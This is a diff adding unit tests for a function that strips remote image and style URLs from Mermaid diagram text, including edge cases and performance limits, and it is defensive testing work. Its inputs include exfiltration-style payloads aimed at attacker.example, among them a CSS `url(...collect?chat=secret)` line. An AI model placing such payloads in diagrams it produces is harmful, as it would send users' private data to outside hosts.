@@ -76,6 +76,55 @@ test("the remote image key is dropped and the rest of the node kept", () => {
   );
 });
 
+test("a `@{` or `}` inside a quoted label does not hide a later shape data block", () => {
+  const img = 'img: "https://attacker.example/label", w: 10, h: 10';
+  for (const [source, kept] of [
+    [`flowchart LR\n  A["@{"] --> B@{ ${img} }`, 'flowchart LR\n  A["@{"] --> B@{ "w":10,"h":10 }'],
+    [`flowchart LR\n  A["x @{ y"] --> C["}"] --> B@{ ${img} }`, 'flowchart LR\n  A["x @{ y"] --> C["}"] --> B@{ "w":10,"h":10 }'],
+    // A `}` inside the real block's quoted label must not close the label's `@{`.
+    [
+      `flowchart LR\n  A["@{"] --> B@{ label: "}", img: "https://attacker.example/x" }`,
+      'flowchart LR\n  A["@{"] --> B@{ "label":"}" }',
+    ],
+    // Accessibility text takes the rest of its line, quotes included.
+    [`flowchart LR\n  accTitle: A " title\n  B@{ ${img} }`, 'flowchart LR\n  accTitle: A " title\n  B@{ "w":10,"h":10 }'],
+  ]) {
+    const out = stripRemoteDiagramImages(source);
+    assert.equal(out, kept);
+    assert.equal(stripRemoteDiagramImages(out), out);
+  }
+});
+
+test("an unterminated `@{` is text and the diagram passes through", () => {
+  const source = "sequenceDiagram\n  Alice->>Bob: show @{ img: foo";
+  assert.equal(stripRemoteDiagramImages(source), source);
+});
+
+test("two readings of `@{` that overlap are both made inert, keeping the text", () => {
+  const source = "sequenceDiagram\n  Alice->>Bob: x @{\n  Bob->>Alice: y @{ img: https://attacker.example/z }";
+  const out = stripRemoteDiagramImages(source);
+  assert.equal(out, "sequenceDiagram\n  Alice->>Bob: x #64;{\n  Bob->>Alice: y #64;{ img: https://attacker.example/z }");
+  assert.equal(stripRemoteDiagramImages(out), out);
+});
+
+test("an overlap makes only its own openers inert, a separate block is still rewritten", () => {
+  const source =
+    'flowchart LR\n  A["show @{ img: @{ img: x }"] --> B@{ img: "https://attacker.example/x", label: "B" }';
+  const out = stripRemoteDiagramImages(source);
+  assert.equal(out, 'flowchart LR\n  A["show #64;{ img: #64;{ img: x }"] --> B@{ "label":"B" }');
+  assert.equal(stripRemoteDiagramImages(out), out);
+});
+
+test("many `@{` sharing one close are not each parsed to the end", () => {
+  for (const filler of ["@{ # ", "@{ # img "]) {
+    const source = `sequenceDiagram\nAlice->>Bob: ${filler.repeat(32000)}}\nBob->>Alice: B@{ img: https://attacker.example/x }`;
+    const started = performance.now();
+    const out = stripRemoteDiagramImages(source);
+    assert.ok(performance.now() - started < 1000, `${filler}: ${performance.now() - started} ms`);
+    assert.equal(out.includes("attacker.example") && out.includes("@{"), false);
+  }
+});
+
 test("a style statement after a semicolon cannot fetch either", () => {
   const url = "url(https://attacker.example/collect?chat=secret)";
   for (const [source, kept] of [
@@ -97,6 +146,13 @@ test("a style statement after a semicolon cannot fetch either", () => {
     assert.equal(out, kept);
     assert.equal(stripRemoteDiagramImages(out), out);
   }
+});
+
+test("many unclosed `@{` markers are scanned in linear time", () => {
+  const source = `sequenceDiagram\n  Alice->>Bob: ${"@{ ".repeat(16000)}`;
+  const started = performance.now();
+  assert.equal(stripRemoteDiagramImages(source), source);
+  assert.ok(performance.now() - started < 1000);
 });
 
 test("a long line of style words is scanned in linear time", () => {
